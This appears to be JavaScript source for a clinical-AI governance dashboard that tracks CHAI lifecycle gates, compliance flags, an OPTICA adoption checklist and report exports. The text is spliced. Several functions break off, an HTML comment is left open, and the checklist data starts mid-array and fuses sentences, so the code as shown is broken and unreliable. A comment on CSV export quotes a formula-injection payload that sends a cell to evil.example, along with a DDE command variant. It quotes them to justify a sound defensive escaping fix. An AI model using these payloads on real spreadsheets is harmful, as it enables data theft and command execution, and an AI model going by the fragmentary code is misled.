   STAGES and GATES from 00-definition.js and are CHAI's alone;
   nothing here is shared with another framework.
   ============================================================ */
function allItems(){ return STAGES.flatMap(s=>s.items.map(it=>({...it,stage:s}))); }
function gapsUpTo(p,stageId){
  const idx=STAGES.findIndex(s=>s.id===stageId);
  return STAGES.slice(0,idx+1).flatMap(s=>s.items.filter(it=>{const st=(p.items[it.id]||{}).status; return !st||st==="notmet";}).map(it=>({...it,stage:s})));
}
const dec = (p,k)=> ((p.gates||{})[k]||{}).decision||"";
const isGo = d => /^(Proceed|Continue)/.test(d||"");
function phase(p){
  // `label` is the English an export records; `msg` is the catalog key a reader sees.
  if([dec(p,"A"),dec(p,"B"),dec(p,"C")].includes("Stop")) return {key:"retired",label:"Stopped",msg:"phase.stopped"};
  if(dec(p,"D")==="Retire") return {key:"retired",label:"Retired",msg:"phase.retired"};
  if(isGo(dec(p,"C"))) return {key:"deployed",label:"Deployed",stage:6,msg:"phase.deployed"};
  if(isGo(dec(p,"B"))) return {key:"pilot",label:"Pilot",stage:5,msg:"phase.pilot"};
  if(isGo(dec(p,"A"))) return {key:"build",label:"Design, build & assess",stage:2,msg:"phase.build"};
  return {key:"intake",label:"Intake & planning",stage:1,msg:"phase.intake"};
}
function cadenceMonths(p){ const n=parseInt(p.meta.reviewCadence,10); return n>0?n:(p.meta.riskTier==="High"?6:12); }
function nextReview(p){
  if(phase(p).key!=="deployed") return null;
  const base = parseDay(dec(p,"D") ? p.gates.D.date : "") || parseDay(p.gates.C.date);
  if(!base) return null;
  return ymd(addMonths(base,cadenceMonths(p)));
}
function latestGo(p){
  let best=null;
  ["A","B","C","D"].forEach(k=>{ const g=p.gates[k]||{}; if(isGo(g.decision)){ const d=parseDay(g.date); if(d && (!best||d>best.d)) best={k,d}; }});
  return best;
}

/* Compliance rules. Red = out of compliance, amber = needs update. */
function flags(p){
  const F=[]; const ph=phase(p); const today=parseDay(TODAY());
  if(ph.key==="retired") return F;
  const live = ph.key==="deployed", piloting = ph.key==="pilot";
  const items=allItems();
  const overdue = items.filter(it=>{const d=p.items[it.id]||{}; const due=parseDay(d.due); return due && due<today && d.status!=="met" && d.status!=="na";});
  if(overdue.length) F.push({sev:(live||piloting)?"red":"amber",text:`${overdue.length} action${overdue.length>1?"s":""} past due`,msg:["flag.pastDue",{count:overdue.length}]});
  if(live){
    const notmet=items.filter(it=>(p.items[it.id]||{}).status==="notmet").length;
    if(notmet) F.push({sev:"red",text:`Live with ${notmet} criteri${notmet>1?"a":"on"} not met`,msg:["flag.liveNotMet",{count:notmet}]});
    const nr=nextReview(p);
    if(!nr) F.push({sev:"red",text:"Live with no deployment date recorded at Checkpoint C",msg:["flag.noDeployDate",{}]});
    else { const d=parseDay(nr), left=daysBetween(today,d);
      if(left<0) F.push({sev:"red",text:`Periodic review overdue since ${fmtDay(nr)}`,msg:["flag.reviewOverdue",{date:nr}]});
      else if(left<=30) F.push({sev:"amber",text:`Periodic review due ${fmtDay(nr)}`,msg:["flag.reviewDue",{date:nr}]}); }
    if(dec(p,"D")==="Retrain or revise") F.push({sev:"amber",text:"Last review asked for retraining or revision",msg:["flag.retrain",{}]});
  }
  if(live||piloting){
    const missing=CORE_CARD.filter(k=>!cardValOf(p,k));
    if(missing.length) F.push({sev:live?"red":"amber",text:`Model card missing ${missing.length} core field${missing.length>1?"s":""}`,msg:["flag.cardMissing",{count:missing.length}]});
    const lg=latestGo(p); const cu=p.cardUpdatedAt?new Date(p.cardUpdatedAt):null;
    if(lg && (!cu || cu < lg.d)) F.push({sev:"amber",text:`Model card not updated since ${GATES[lg.k].title}`,msg:["flag.cardStale",{gate:GATES[lg.k].title}]});
    if(!p.metrics.some(m=>m.name||m.value)) F.push({sev:"amber",text:"No key metrics recorded",msg:["flag.noMetrics",{}]});
  }
  ["A","B","C","D"].forEach(k=>{ const g=p.gates[k]||{};
    if(isGo(g.decision) && !(g.rationale||"").trim()){
      if(/conditions|changes/.test(g.decision)) F.push({sev:"amber",text:`${GATES[k].title}: conditional approval with no conditions recorded`,msg:["flag.noConditions",{gate:GATES[k].title}]});
      else if(gapsUpTo(p,GATES[k].after).length) F.push({sev:"amber",text:`${GATES[k].title}: approved with open criteria and no rationale`,msg:["flag.noRationale",{gate:GATES[k].title}]});
    }});
  if(!live && p.updatedAt){ const idle=daysBetween(new Date(p.updatedAt),new Date()); if(idle>90) F.push({sev:"amber",text:`No activity in ${idle} days`,msg:["flag.idle",{count:idle}]}); }
  return F.sort((a,b)=>(a.sev==="red"?0:1)-(b.sev==="red"?0:1));
}
function statusOf(p){
  const ph=phase(p); if(ph.key==="retired") return {key:"retired",label:ph.label,msg:ph.msg};
  const f=flags(p);
  if(f.some(x=>x.sev==="red")) return {key:"red",label:"Out of compliance",msg:"status.red"};
  if(f.length) return {key:"amber",label:"Needs update",msg:"status.amber"};
  return {key:"green",label:"On track",msg:"status.green"};
}

/* What a reader sees for a phase, a status or a flag. The objects keep their English
   `label`/`text` for exports (which stay English); `msg` names the catalog entry, and
   a date parameter is formatted in the reader's language here. */
const phaseLabel = ph => t(ph.msg);
const statusLabel = st => t(st.msg);
function flagText(f){
  if(!f.msg) return f.text;
  const [key, params] = f.msg;
  const p = Object.assign({}, params);
  if(p.date) p.date = fmtDay(p.date);
  return t(key, p);
}

function teSuggestHTML(){
  const chosen = (S.meta||{}).chaiUseCase || "";

    .map(([k,v])=>`<option value="${esc(k)}"${k===chosen?" selected":""}>${esc(v.label)}</option>`)

    body = METRIC_CATS.filter(c=>byCat[c]).map(c=>`

            title="${esc(note||t("te.recommended"))}">${added?"\u2713 ":""}${esc(m.name)}</button>`;
        }).join("")}
      </div>`).join("")
      // The attribution CC BY 4.0 requires: the source, the license and the copyright
      // line stay in every language (te.credit keeps {link} and the © line verbatim).
      + `<p style="font-size:12px;color:var(--muted);margin:12px 0 0">${tHtml("te.credit",{count:uc.metrics.length},{link:`<a href="${esc(uc.url)}" target="_blank" rel="noopener">${esc(t("te.linkText",{label:uc.label}))}</a>`})}</p>`;
  }

  return `<details class="fallback ro-hide" style="margin-top:16px"${chosen?" open":""}>

}

/* ============================================================
   CHAI: registration
   Declares CHAI to the shell. This is the only file that has to
   change when a CHAI screen is added or reordered.

   CHAI is always enabled. It owns the project document's `items`
   and `gates` keys, the compliance status on the dashboard, and the
   applied model card -- so the tool is a CHAI tool with other
   frameworks alongside, not a neutral host of several equals. That
   is a deliberate choice: the dashboard needs ONE status, and
   mixing two frameworks' judgements into one number would be
   meaningless. See docs/crosswalk.md.
   ============================================================ */
registerFramework({
  id: "chai",
  label: "CHAI",

  enabled: () => true,

  blank: () => ({ items: {}, gates: { A: {}, B: {}, C: {}, D: {} } }),

  normalize(p) {
    p.items = p.items || {};
    p.gates = Object.assign({ A: {}, B: {}, C: {}, D: {} }, p.gates || {});
  },

  views(p) {
    const out = [];
    STAGES.forEach(s => {
      out.push({
        id: s.id, kind: "stage", label: s.title, num: s.n, short: t("rail.stageShort", {n: s.n}),
        meta: () => { const c = scoreOf(s.items, p.items); return `${c.answered}/${c.total}`; },
        metaCls: () => { const c = scoreOf(s.items, p.items); return c.answered === c.total ? "done" : ""; },
      });
      Object.entries(GATES).filter(([, g]) => g.after === s.id).forEach(([key, g]) => {
        out.push({
          id: "g" + key, kind: "gate", gate: key, label: g.title, cls: "gate",
          numHTML: '<span class="diamond" aria-hidden="true"></span>',
          meta: () => { const d = (p.gates[key] || {}).decision || ""; return d ? esc(shortDecision(d)) : esc(t("dash.gateOpen")); },
          metaCls: () => { const d = (p.gates[key] || {}).decision || ""; return !d ? "" : (/Stop|Retire|Revise|Retrain/.test(d) ? "warn" : "done"); },
        });
      });
    });
    out.push({
      id: "card", kind: "card", label: t("card.title"), glyph: "≡", sep: "before",
      meta: () => `${CARD_FIELDS.filter(k => cardValOf(p, k)).length}/${CARD_FIELDS.length}`,
    });
    out.push({ id: "report", kind: "report", label: t("rail.report"), glyph: "✓" });
    return out;
  },

  render(v) {
    if (v.kind === "stage") return renderStage(STAGES.find(s => s.id === v.id));
    if (v.kind === "gate") return renderGate(v.gate);
    if (v.kind === "card") return renderCardForm();
    return renderReport();
  },
});

","rel":"partial","chai":["s5-1","s5-2","s5-3"]}]},{"n":8,"domain":"C","title":"Explainability","purpose":"Determine whether the solution can account for its outputs both model-wide and case by case, and whether those accounts stand up to clinical scrutiny.","items":[{"key":"8-1","num":"8.1","text":"Identify which variables drive the model's behavior overall, or account for why such a ranking cannot be produced.","who":"developer","stage":"B","rel":"partial","chai":["s4-6"]},{"key":"8-2","num":"8.2","text":"State whether the solution can justify the result it produces for one specific case, and illustrate with worked examples spanning different kinds of patients.","who":"developer","stage":"B","rel":"partial","chai":["s4-6"]},{"key":"8-3","num":"8.3","text":"Give a clinician's verdict on whether the model-wide and per-case explanations hold up medically.","who":"adopter","stage":"C","rel":"partial","chai":["s4-6"]}]},{"n":9,"domain":"C","title":"Regulations, data security & privacy","purpose":"Confirm the solution can be fielded lawfully and safely — regulatory conformity, honesty with patients, protection of data against attack, and respect for privacy rules.","items":[{"key":"9-1","num":"9.1","text":"Establish whether the solution satisfies the regulatory rules that apply in this jurisdiction and this institution, drawing on legal counsel and the information security lead.","who":"adopter","stage":"C","rel":"partial","chai":["s1-7"]},{"key":"9-2","num":"9.2","text":"Decide whether patients are told clearly enough that an algorithm plays a part in their care, with legal input on what disclosure is actually owed.","who":"adopter","stage":"C","rel":"partial","chai":["s5-6","s1-7"]},{"key":"9-3","num":"9.3","text":"Verify that the solution meets the institution's requirements for safeguarding data and withstanding attack, with the information security lead involved.","who":"adopter","stage":"D","rel":"equivalent","chai":["s4-7"]},{"key":"9-4","num":"9.4","text":"Confirm that the solution's handling of identifiable information satisfies the privacy rules that apply locally, again with the information security lead involved.","who":"adopter","stage":"D","rel":"partial","chai":["s1-7","s3-6"]}]},{"n":10,"domain":"D","title":"Deployment plan","purpose":"Pins down how the solution will actually be wired into clinical work and into the organization's technical stack - where it surfaces, who acts on it, and what has to be built to serve it.","items":[{"key":"10-1","num":"10.1","text":"Pinpoint where along the care pathway the tool fires - which encounter, decision point, or step of the existing process it attaches to.","who":"adopter","stage":"C","rel":"partial","chai":["s2-2","s2-1"]},{"key":"10-2","num":"10.2","text":"Name the host application or screen where clinicians will actually see the result, and describe how using it is meant to feel day to day - how discoverable it is, how many clicks it costs, how reliably it is on hand.","who":"adopter","stage":"C","rel":"partial","chai":["s2-1","s5-2"]},{"key":"10-3","num":"10.3","text":"State whether a named human clinician stands between the model and the patient, owning the choice to act on a result or set it aside.","who":"adopter","stage":"C","rel":"partial","chai":["s2-5","s1-6"]},{"key":"10-4","num":"10.4","text":"If each result has to arrive with its rationale attached, work out how that supporting explanation gets rendered inside the host system next to the result itself.","who":"adopter","stage":"C","rel":"partial","chai":["s4-6"]},{"key":"10-5","num":"10.5","text":"Determine whether fresh interfaces or middleware must be built to carry results from whatever serves the model over to the system that will display them.","who":"either","stage":"E","rel":"partial","chai":["s2-7","s4-5"]},{"key":"10-6","num":"10.6","text":"Identify the host hardware the model will execute on and confirm its compute and memory headroom are adequate for the expected load.","who":"either","stage":"E","rel":"partial","chai":["s4-5"]},{"key":"10-7","num":"10.7","text":"Confirm that every input feed reaches that execution environment promptly enough to be useful, and flag which feeds must arrive live rather than on a batch schedule.","who":"either","stage":"E","rel":"partial","chai":["s3-4"]}]},{"n":11,"domain":"D","title":"Monitoring plan","purpose":"Establishes how the system will be watched once live, so that drift in its inputs, its outputs, its accuracy, or the underlying medical knowledge is caught rather than discovered late.","items":[{"key":"11-1","num":"11.1","text":"From the builder's standpoint, state the cadence at which the model has to be refreshed or refit.","who":"developer","stage":"B","rel":"partial","chai":["s6-3"]},{"key":"11-2","num":"11.2","text":"Say whether the system refits itself automatically in the field, and if it does, describe how each refreshed version's quality gets verified before it influences care.","who":"developer","stage":"B","rel":"partial","chai":["s6-3"]},{"key":"11-3","num":"11.3","text":"Lay out how incoming feature values will be watched for drift or outright breakage once the system is running.","who":"adopter","stage":"E","rel":"partial","chai":["s6-1"]},{"key":"11-4","num":"11.4","text":"Lay out the equivalent watch on what the model emits, so that shifts in the distribution of its results surface early.","who":"adopter","stage":"E","rel":"partial","chai":["s6-1","s6-4"]},{"key":"11-5","num":"11.5","text":"From the clinical side, state how often the medical content baked into the solution - guidelines, thresholds, standards of care - needs refreshing.","who":"adopter","stage":"F","rel":"partial","chai":["s6-3"]},{"key":"11-6","num":"11.6","text":"Set out how the solution's accuracy will keep being measured after go-live, not only before it.","who":"either","stage":"F","rel":"partial","chai":["s6-1","s6-2"]}]},{"n":12,"domain":"D","title":"Evaluation plan","purpose":"Settles in advance how the deployment's real-world be adopter","stage":"G","rel":"optica-only","chai":[]}]}]};
const OPTICA_ITEMS = OPTICA.chapters.flatMap(c => c.items.map(i => ({ ...i, chapter: c })));

/* ============================================================
   OPTICA: rules
   OPTICA's own progress, kept strictly apart from CHAI's.

   Two rules decide everything here, both from docs/crosswalk.md:

   1. NO STATUS PROPAGATION, in either direction. Evidence is shared
      by citing it; judgment never is. No OPTICA answer may change a
      CHAI criterion's status or a readiness percentage, and none of
      this feeds flags() or statusOf(). Breaking that would silently
      re-gate every existing project.

   2. A DECLINE IS A DISTINCT STATE. OPTICA accepts a reasoned "we
      chose not to" as a complete answer for some items; CHAI's
      local-validation obligations are unconditional. So "declined"
      is tracked separately and never folded into the percentage as
      though it were met.
   ============================================================ */
const OPTICA_STATUS = { met: "Answered", partial: "Partial", notmet: "Outstanding", declined: "Declined", na: "N/A" };
const OPTICA_VAL = { met: 1, partial: 0.5, notmet: 0, declined: 0 };

const opticaOn = p => !!((p || S).optica || {}).enabled;
const opticaAnswers = p => ((p || S).optica || {}).answers || {};
const opticaAnswer = (p, key) => opticaAnswers(p)[key] || {};

/* Progress over any list of OPTICA items. Declines are counted as
   answered (the stakeholder did respond) but contribute nothing to
   the percentage, and are reported separately so they stay visible. */
function opticaScore(items, p) {
  const answers = opticaAnswers(p);
  let sum = 0, n = 0, answered = 0, declined = 0;
  items.forEach(it => {
    const st = (answers[it.key] || {}).status;
    if (st) answered++;
    if (st === "declined") { declined++; return; }
    if (st === "na") return;
    n++; sum += OPTICA_VAL[st] || 0;
  });
  return { pct: n ? Math.round(sum / n * 100) : 0, answered, total: items.length, applicable: n, declined };
}

/* Who still owes answers. OPTICA assigns each item to one of five
   stakeholders and runs them in sequence, so "which stakeholder is
   blocking" is the question that actually moves a review along --
   and ~a third of the items can only be answered by the vendor. */
function opticaByProducer(p) {
  const answers = opticaAnswers(p);
  const out = {};
  OPTICA_ITEMS.forEach(it => {
    const who = it.who || "unassigned";
    const b = out[who] || (out[who] = { who, total: 0, answered: 0, outstanding: [] });
    b.total++;
    if ((answers[it.key] || {}).status) b.answered++;
    else b.outstanding.push(it);
  });
  return Object.values(out).sort((a, b) => b.total - a.total);
}

const opticaOutstanding = p => OPTICA_ITEMS.filter(it => !(opticaAnswer(p, it.key).status));

/* ============================================================
   OPTICA: views
   One screen per chapter, plus an overview that answers the
   question OPTICA's stakeholder relay actually turns on: who owes
   the next answers.

   Markup reuses the CHAI checklist classes (.ci, .seg, .checklist)
   so no new CSS is needed and the two checklists look like one
   tool. The state path differs -- optica.answers.<key> rather than
   items.<id> -- which is what keeps the data cleanly separable.
   ============================================================ */
const OPTICA_PRODUCER_LABEL = {
  adopter: "Your organization",
  developer: "The solution's developer",
  either: "Either party",
};

function opticaItemHTML(it) {
  const d = opticaAnswer(S, it.key);
  const st = d.status || "";
  const open = openItems.has(it.key);
  const late = d.due && parseDay(d.due) < parseDay(TODAY()) && st !== "met" && st !== "na";
  const notes = (d.evidence || d.owner || d.due || d.declineReason) && !open
    ? `<span class="has-notes">${late ? `<b style="color:var(--red)">overdue ${esc(fmtDay(d.due))}</b>` : "notes added"}</span>` : "";
  const chai = it.chai && it.chai.length
    ? `<span class="pchip" title="Partially covered by CHAI ${esc(it.chai.join(", "))}">${esc(it.chai[0])}</span>`
    : `<span class="pchip" title="No CHAI criterion covers this">—</span>`;

  return `<li class="ci${open ? " open" : ""}" data-item="${esc(it.key)}">
    <div class="ci-row">
      ${chai}
      <div class="ci-text">${esc(it.text)}<button class="more" data-toggle="${esc(it.key)}" aria-expanded="${open}">${open ? "Hide details" : "Evidence & owner"}</button>${notes}</div>
      <div class="seg" role="group" aria-label="Status">${Object.entries(OPTICA_STATUS).map(([k, l]) =>
        `<button data-set="${esc(it.key)}" data-store="optica.answers" data-s="${k}" aria-pressed="${st === k}">${l}</button>`).join("")}</div>
    </div>
    <div class="ci-detail">
      <div><label for="oev_${esc(it.key)}">Evidence or notes</label><textarea id="oev_${esc(it.key)}" rows="2" data-bind="optica.answers.${esc(it.key)}.evidence" ${NO_BROWSER_ASSIST}>${esc(d.evidence || "")}</textarea></div>
      <div><label for="oow_${esc(it.key)}">Owner</label><input type="text" id="oow_${esc(it.key)}" data-bind="optica.answers.${esc(it.key)}.owner" value="${esc(d.owner || "")}"></div>
      <div><label for="odu_${esc(it.key)}">Due</label><input type="date" id="odu_${esc(it.key)}" data-bind="optica.answers.${esc(it.key)}.due" value="${esc(d.due || "")}"></div>
      ${st === "declined" ? `<div class="wide"><label for="odr_${esc(it.key)}">Why this was declined</label><textarea id="odr_${esc(it.key)}" rows="2" data-bind="optica.answers.${esc(it.key)}.declineReason" ${NO_BROWSER_ASSIST}>${esc(d.declineReason || "")}</textarea></div>` : ""}
    </div>
  </li>`;
}

function renderOpticaChapter(n) {
  const c = OPTICA.chapters.find(x => x.n === n);
  const s = opticaScore(c.items, S);
  const vendor = c.items.filter(i => i.who === "developer").length;
  return `<p class="eyebrow">OPTICA chapter ${c.n} of 13 · domain ${c.domain}</p>
  <h1>${esc(c.title)}</h1>
  ${c.purpose ? `<p class="lede">${esc(c.purpose)}</p>` : ""}
  <div class="legend">
    <span>Questions are this project's paraphrase of OPTICA, not its published wording.</span>
  </div>
  ${vendor ? `<p style="font-size:13px;color:var(--muted)">${vendor} of ${c.items.length} item${vendor === 1 ? "" : "s"} here can only be answered by the solution's developer.</p>` : ""}
  <ol class="checklist">${c.items.map(opticaItemHTML).join("")}</ol>
  <p style="font-size:13px;color:var(--muted);margin-top:10px">${s.answered} of ${s.total} answered${s.declined ? `, ${s.declined} declined` : ""}. The chip on each row names the CHAI criterion that partially covers it, or a dash where none does.</p>
  ${pager()}`;
}

function renderOpticaOverview() {
  const all = opticaScore(OPTICA_ITEMS, S);
  const byWho = opticaByProducer(S);
  const rows = byWho.map(b => `<tr>
      <td>${esc(OPTICA_PRODUCER_LABEL[b.who] || b.who)}</td>
      <td>${b.answered}/${b.total}</td>
      <td>${b.outstanding.length ? esc(b.outstanding.slice(0, 6).map(i => i.num).join(", ")) + (b.outstanding.length > 6 ? ` +${b.outstanding.length - 6} more` : "") : "—"}</td>
    </tr>`).join("");

  return `<p class="eyebrow">OPTICA</p>
  <h1>Adoption review</h1>
  <p class="lede">77 items in 13 chapters, answered by five stakeholders in sequence. OPTICA asks whether <em>this</em> organization should adopt <em>this</em> solution; it runs alongside the CHAI lifecycle and never changes it.</p>

  <div class="cards">
    <div class="card"><h3>Answered</h3><p class="big">${all.answered}/${all.total}</p></div>
    <div class="card"><h3>Progress</h3><p class="big">${all.pct}%</p></div>
    <div class="card"><h3>Declined</h3><p class="big">${all.declined}</p></div>
  </div>

  <h2>Who owes the next answers</h2>
  <p style="font-size:13px;color:var(--muted)">OPTICA is a relay: each stage is completed by one stakeholder before the next begins. Outstanding items are listed by the party that can answer them.</p>
  <table class="tbl"><thead><tr><th>Stakeholder</th><th>Answered</th><th>Outstanding</th></tr></thead><tbody>${rows}</tbody></table>

  <div class="note">
    <p><b>OPTICA answers never change CHAI status.</b> The two checklists ask different parties for different evidence at different moments, and no OPTICA item fully discharges a CHAI criterion. Evidence can be cited in both; a judgment in one is not a judgment in the other.</p>
  </div>
  ${pager()}`;
}

function renderOpticaOff() {
  return `<p class="eyebrow">OPTICA</p><h1>Adoption review</h1>
  <p class="lede">OPTICA is not switched on for this project.</p>
  <p>Turn it on in <button class="btn" data-go="setup">Project setup</button> to add its 77 adoption questions alongside the CHAI lifecycle.</p>`;
}

/* ============================================================
   OPTICA: registration
   Opt-in per project. A project that has never switched OPTICA on
   carries no `optica` key at all, so existing exports stay valid
   and teams that only run CHAI never see 77 extra rows.
   ============================================================ */
registerFramework({
  id: "optica",
  label: "OPTICA",

  enabled: p => opticaOn(p),

  // Deliberately empty: a new project does NOT get an optica key.
  // It appears the first time someone switches the framework on.
  blank: () => ({}),

  normalize(p) {
    if (!p.optica) return;
    p.optica.enabled = !!p.optica.enabled;
    p.optica.answers = p.optica.answers || {};
  },

  views(p) {
    const out = [{
      id: "optica", kind: "overview", label: "OPTICA adoption review",
      glyph: "◇", sep: "before",
      meta: () => { const s = opticaScore(OPTICA_ITEMS, p); return `${s.answered}/${s.total}`; },
      metaCls: () => { const s = opticaScore(OPTICA_ITEMS, p); return s.answered === s.total ? "done" : ""; },
      short: "OPTICA",
    }];
    OPTICA.chapters.forEach(c => {
      out.push({
        id: "o" + c.n, kind: "chapter", chapter: c.n, label: c.title, num: c.n,
        short: `OPTICA ${c.n}`,
        meta: () => { const s = opticaScore(c.items, p); return `${s.answered}/${s.total}`; },
        metaCls: () => { const s = opticaScore(c.items, p); return s.answered === s.total ? "done" : ""; },
      });
    });
    return out;
  },

  render(v) {
    if (!opticaOn(S)) return renderOpticaOff();
    return v.kind === "chapter" ? renderOpticaChapter(v.chapter) : renderOpticaOverview();
  },
});

/* Switching the framework on or off for the open project. Turning it
   off keeps every answer: it only hides the views, so a team that
   pauses an OPTICA review does not lose the work. */
function setOpticaEnabled(on) {
  if (RO || !S) return;
  if (!S.optica) S.optica = { enabled: false, answers: {} };
  edit("optica.enabled", !!on);
  writeLog(CUR, `${on ? "Enabled" : "Disabled"} the OPTICA adoption review`);
  if (!on && String(UI.view).startsWith("o")) go("setup");
  else renderProject(false);
}

/* ============================================================
   App shell: rail and routing
   Builds the step rail from whatever views the active frameworks
   contribute, and dispatches rendering back to the framework that
   owns the current view. Nothing here names CHAI or OPTICA.
   ============================================================ */
function railRow(v) {
  const cur = UI.view === v.id ? ' aria-current="step"' : "";
  const meta = typeof v.meta === "function" ? v.meta() : (v.meta || "");
  // numHTML lets a view supply its own marker element (the checkpoint
  // diamond); glyph covers the common case of a single character.
  const num = v.numHTML ? `<span class="num">${v.numHTML}</span>`
    : v.num == null ? `<span class="num" aria-hidden="true">${esc(v.glyph || "•")}</span>`
    : `<span class="num">${esc(String(v.num))}</span>`;
  // A view that computes a state class always gets the separating space, even
  // when the class is empty this render; a view with no metaCls gets none.
  // That reproduces the markup the hand-written rail emitted exactly.
  const metaCls = v.metaCls ? ` ${esc(v.metaCls())}` : "";
  const li = `<li${v.cls ? ` class="${v.cls}"` : ""}><button data-go="${esc(v.id)}"${cur}>`
    + `${num}<span>${esc(v.label)}</span>`
    + `<span class="meta${metaCls}">${meta}</span></button></li>`;
  const sep = `<li class="sep" role="presentation"></li>`;
  return (v.sep === "before" ? sep : "") + li + (v.sep === "after" ? sep : "");
}

function renderRail() {
  const ol = document.getElementById("rail");
  const home = `<li class="home-link"><button data-home="1">`
    + `<span class="num" aria-hidden="true">←</span><span>${esc(t("nav.allProjects"))}</span></button></li>`
    + `<li class="sep" role="presentation"></li>`;
  ol.innerHTML = home + activeViews().map(railRow).join("");
  document.getElementById("projName").textContent = S.meta.solution || t("project.untitled");
}

function renderMain(focusTop) {
  const views = activeViews();
  const v = views.find(x => x.id === UI.view) || views[0];
  const m = document.getElementById("main");
  const fk = focusTop ? null : focusKey(document.activeElement);

function lcTrack(p){

  const pip=s=>{const c=scoreOf(s.items,p.items); const frac=c.total?c.answered/c.total:0;
    return `<span class="pip${frac===1?" full":""}${ph.stage===s.n?" cur":""}" title="${esc(t("dash.pipTitle",{n:s.n,answered:c.answered,total:c.total}))}"><i style="height:${Math.round(frac*100)}%"></i>${s.n}</span>`;};
  const gd=k=>{const d=dec(p,k); const cls=!d?"":(/Stop|Retire/.test(d)?"stop":/conditions|changes|Revise|Retrain/.test(d)?"cond":"go"); return `<span class="gd ${cls}" title="${esc(GATES[k].title)}: ${esc(d||t("dash.gateOpen"))}"></span>`;};

<!-- No webfont link. The exported report is the artifact that gets emailed

/* PDF, via the browser's own print-to-PDF.

   No PDF library is bundled. Every option (jsPDF, pdfmake, html2pdf) is
   hundreds of kilobytes, and this dashboard has to stay one self-contained
   file small enough to publish as an artifact -- a PDF writer would be larger
   than the entire application. Browsers already render HTML to PDF well, with
   correct fonts, selectable text and working links, which a canvas-based
   library does not give you.

   The report is printed from an offscreen iframe holding exactly the
   standalone HTML export, not from the live page. Printing the page would
   carry the app's own print stylesheet and its DOM state; this way the PDF and
   the HTML download are the same document, and what the user sees in the print
   preview is what the HTML export contains. */
function exportPDF(){
  const frame = document.createElement("iframe");
  frame.setAttribute("aria-hidden", "true");
  frame.setAttribute("title", "Report for printing");
  frame.style.cssText = "position:fixed;left:-9999px;top:0;width:820px;height:1160px;border:0";
  frame.onload = () => {
    const win = frame.contentWindow;
    const go = () => {
      try{ win.focus(); win.print(); }
      catch(e){ toast(t("toast.printFailed")); }
      // Keep the frame alive briefly: some browsers run print() asynchronously
      // and removing it immediately cancels the dialog.
      setTimeout(() => frame.remove(), 60000);
    };
    // Wait for the webfonts, or the first page renders in a fallback face.
    const fonts = win.document.fonts;
    if(fonts && fonts.ready) fonts.ready.then(go).catch(go);
    else setTimeout(go, 400);
  };
  document.body.appendChild(frame);
  // srcdoc keeps it same-origin, so contentWindow.print() is reachable; a blob
  // URL would be a different origin in some browsers and throw.
  frame.srcdoc = exportHTML();
  toast(t("toast.printOpening"));
}

function exportMD(){

  L.push(`## Readiness`,"",`Overall: **${ov.pct}%** of applicable criteria met (${ov.answered}/${ov.total} answered).`,"","| Principle | Score |","|---|---|");
  Object.entries(PRINCIPLES).forEach(([k,p])=>L.push(`| ${p.name} | ${scoreOf(all.filter(it=>it.p===k)).pct}% |`));
  L.push("","## Checkpoint decisions","","| Checkpoint | Decision | Decided by | Date | Rationale |","|---|---|---|---|---|");
  Object.entries(GATES).forEach(([k,G])=>{const g=S.gates[k]||{}; L.push(`| ${G.title}: ${G.q} | ${g.decision||"Not decided"} | ${line(g.by)}${g.signedBy?` (recorded by ${line(nm(g.signedBy))})`:""} | ${line(g.date)} | ${line(g.rationale)} |`);});
  L.push("","## Open gaps","");
  const gaps=all.filter(it=>{const s=(S.items[it.id]||{}).status; return !s||s==="notmet"||s==="partial";});
  if(gaps.length){ L.push("| Stage | Criterion | Status | Owner | Due |","|---|---|---|---|---|"); gaps.forEach(it=>{const d=S.items[it.id]||{}; L.push(`| ${it.stage.n} | ${line(it.text)} | ${st(d.status)} | ${line(d.owner)} | ${line(d.due)} |`);}); }
  else L.push("None.");
  L.push("","## Applied model card","");
  CARD.forEach(sec=>{L.push(`### ${sec.sec}`,""); sec.fields.forEach(f=>L.push(`- **${f[1]}:** ${line(cardValOf(S,f[0]))||"_Not provided_"}`)); L.push("");
    if(sec.sec==="Trust ingredients"){ L.push("### Key metrics",""); if(S.metrics.length){L.push("| Category | Metric | Value | 95% CI | Population |","|---|---|---|---|---|"); S.metrics.forEach(x=>L.push(`| ${line(x.cat)} | ${line(x.name)} | ${line(x.value)} | ${line(x.ci)} | ${line(x.pop)} |`));} else L.push("_None entered_"); L.push("");}});
  L.push("## Sign-off history",""); if(logWindowNote()) L.push(`_${logWindowNote()}_`,""); if(LOG.length) LOG.forEach(e=>L.push(`- ${(e.at||"").slice(0,10)}: ${line(e.text)} (${line(nm(e.by))})`)); else L.push("None."); L.push("");
  L.push("## Appendix: full checklist","");
  STAGES.forEach(s=>{L.push(`### ${s.n}. ${s.title}`,""); s.items.forEach(it=>{const d=S.items[it.id]||{}; L.push(`- [${it.p}] ${it.text}: **${st(d.status)}**${d.evidence?` (${line(d.evidence)})`:""}`);}); L.push("");});
  L.push("---","_Structured around the CHAI six-stage lifecycle and Applied Model Card. Checklist wording is paraphrased; this is an internal governance record, not a CHAI certification._");
  return L.join("\n");
}
function projectJSON(p){

/* One CSV field, quoted and defanged.

   RFC 4180 quoting is not enough here. Excel, LibreOffice and Google Sheets
   all treat a cell beginning with =, +, - or @ as a FORMULA, inside quotes or
   not, so a project named

     =HYPERLINK("https://evil.example/?x="&A1,"Review status")

   becomes a live link in every committee member's copy of the portfolio
   export. =cmd|'/c calc'!A0 is the DDE variant. The portfolio CSV exists
   specifically to be opened in a spreadsheet, and any writer on any single
   project controls one of its cells.

   A leading apostrophe makes the spreadsheet treat the rest as literal text.
   It is visible in the formula bar and not in the cell, which is the least
   intrusive fix that actually works. Leading tab and carriage return are
   included because they slip past a naive check on the first character and
   still leave a formula behind. */
const CSV_FORMULA = /^[=+\-@\t\r]/;
function csvField(value){
  let text = String(value ?? "");
  if(CSV_FORMULA.test(text)) text = "'" + text;
  return `"${text.replace(/"/g,'""')}"`;
}

function exportCSV(){
  const q=csvField;
  const head=["Project","Developer","Clinical sponsor","Risk tier","Lifecycle phase","Status","Readiness %","Next review","Flags","Archived","Last updated","Stored in"];
  const rows=dashData().map(r=>[r.p.meta.solution,r.p.meta.developer,r.p.meta.sponsor,r.p.meta.riskTier,phase(r.p).label,r.st.label,r.score,r.nr||"",r.f.map(f=>f.text).join("; "),r.p.archived?"yes":"",(r.p.updatedAt||"").slice(0,10),storageNote().label]);
  return [head,...rows].map(r=>r.map(q).join(",")).join("\r\n");
}
